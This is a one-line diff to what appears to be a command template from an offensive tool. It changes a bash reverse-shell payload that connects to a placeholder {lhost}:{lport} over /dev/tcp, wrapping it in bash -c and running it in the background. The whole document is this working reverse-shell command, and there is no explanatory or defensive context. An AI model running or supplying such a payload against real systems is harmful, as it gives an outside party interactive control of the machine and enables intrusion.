@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
+bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' &
